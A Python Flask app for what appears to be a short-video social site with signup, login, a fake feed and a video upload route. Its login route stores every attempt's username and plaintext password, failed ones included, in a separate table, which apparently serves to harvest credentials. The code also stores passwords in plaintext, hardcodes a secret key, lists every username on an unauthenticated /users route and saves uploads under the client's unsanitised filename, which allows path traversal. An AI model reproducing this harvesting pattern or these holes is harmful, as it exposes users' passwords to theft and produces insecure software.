from flask import Flask, render_template, request, redirect, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = "Jordan@22"

DB_NAME = "users.db"


# ---------------- DATABASE ----------------
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()

    c.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        password TEXT
    )
    """)

    c.execute("""
    CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        password TEXT,
        status TEXT
    )
    """)

    c.execute("""
    CREATE TABLE IF NOT EXISTS videos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title TEXT,
        filename TEXT,
        user_id INTEGER
    )
    """)

    conn.commit()
    conn.close()


init_db()


def get_db():
    return sqlite3.connect(DB_NAME)


# ---------------- HOME ----------------
@app.route("/")
def index():
    videos = [
        {"username": "@jordan_hersey", "swimming": "Watch this 🔥", "file": "videos/video4.mp4"}
    ]

    return render_template("landing.html", videos=videos)

# ---------------- SIGNUP ----------------
@app.route("/signup", methods=["GET", "POST"])
def signup():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        conn = get_db()
        c = conn.cursor()

        c.execute(
            "INSERT INTO users (username, password) VALUES (?, ?)",
            (username, password)
        )

        conn.commit()
        conn.close()

        return redirect("/login")

    return render_template("signup.html")


# ---------------- LOGIN ----------------
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        conn = get_db()
        c = conn.cursor()

        c.execute(
            "SELECT * FROM users WHERE username=? AND password=?",
            (username, password)
        )

        user = c.fetchone()

        # SAVE LOGIN ATTEMPT
        c.execute(
            "INSERT INTO logins (username, password, status) VALUES (?, ?, ?)",
            (username, password, "valid" if user else "invalid")
        )

        conn.commit()
        conn.close()

        if user:
            session["user"] = username
            return redirect("/feed")

        return "Invalid login saved"

    return render_template("login.html")


# ---------------- LOGOUT ----------------
@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")


# ---------------- FEED ----------------
@app.route("/feed")
def feed():
    if "user" not in session:
        return redirect("/login")

    videos = [
    {
        "username": "rita67",
        "caption": "Loving black 🔥",
        "file": "videos/video2.mp4",
        "likes": 3200,
        "comments": 120,
        "shares": 45
    },
    {
        "username": "jovita_bae",
        "caption": "Dance trend 💃",
        "file": "videos/video3.mp4",
        "likes": 5400,
        "comments": 310,
        "shares": 88
    },
    {
        "username": "jordan76",
        "caption": "swimming",
        "file": "videos/video4.mp4",
        "likes": 890,
        "comments": 45,
        "shares": 12
    }
]

    return render_template("feed.html", videos=videos, current_user=session["user"])


# ---------------- PROFILE ----------------
@app.route("/profile")
def profile():
    if "user" not in session:
        return redirect("/login")

    profile_data = {
        "username": session["user"],
        "followers": 1200,
        "following": 85,
        "likes": 9800
    }

    return render_template("profile.html", profile=profile_data)


# ---------------- USERS ----------------
@app.route("/users")
def users():
    conn = get_db()
    c = conn.cursor()

    c.execute("SELECT username FROM users")
    rows = c.fetchall()

    conn.close()

    return "<br>".join([r[0] for r in rows])


# ---------------- UPLOAD ----------------
@app.route("/upload", methods=["GET", "POST"])
def upload():
    if "user" not in session:
        return redirect("/login")

    if request.method == "POST":
        file = request.files["video"]
        title = request.form["title"]

        if file:
            os.makedirs("static/videos", exist_ok=True)

            path = os.path.join("static/videos", file.filename)
            file.save(path)

            conn = get_db()
            c = conn.cursor()

            c.execute(
                "INSERT INTO videos (title, filename, user_id) VALUES (?, ?, ?)",
                (title, file.filename, session["user"])
            )

            conn.commit()
            conn.close()

            return redirect("/feed")

    return render_template("upload.html")

import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
